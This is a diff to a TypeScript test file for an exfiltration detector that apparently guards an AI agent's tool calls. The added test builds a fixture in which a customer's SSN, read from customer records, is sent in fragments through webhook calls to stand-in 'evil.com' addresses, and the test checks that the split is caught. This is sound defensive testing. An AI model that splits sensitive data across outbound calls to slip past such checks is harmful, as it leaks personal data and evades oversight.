@@ -320,6 +320,50 @@ describe('detectSplitExfiltration', () => {
       expect(result?.destination).toBe('evil.com');
       expect(result?.matchedFields).toContain('123-45-6789');
     });
+
+    it('should detect fragment reassembly when outbound args contain metadata around the payload', () => {
+      const session = makeSessionWithOutboundHistory(
+        [
+          {
+            toolName: 'postWebhook',
+            turnId: 'turn-000',
+            bytes: 8,
+            destination: 'ops@evil.com',
+            text: '12345',
+          },
+        ],
+        {
+          privilegedValues: [],
+          sensitiveEntities: [
+            {
+              type: 'ssn',
+              rawValue: '123-45-6789',
+              canonicalValue: '123456789',
+              sourceTool: 'readCustomerRecords',
+              fieldName: 'ssn',
+              confidence: 'high',
+              timestamp: Date.now(),
+            },
+          ],
+        },
+      );
+
+      const ctx = makeCtx({
+        toolName: 'postWebhook',
+        toolArguments: {
+          vertical: 'enterprise',
+          level: 'L5',
+          recipient: 'audit@evil.com',
+          payload: '6789',
+        },
+      });
+
+      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
+      expect(result).not.toBeNull();
+      expect(result?.destinationCluster).toBe(true);
+      expect(result?.fragmentReassembly).toBe(true);
+      expect(result?.matchedFields).toContain('123-45-6789');
+    });
   });
 
   describe('does not fire on benign cases', () => {
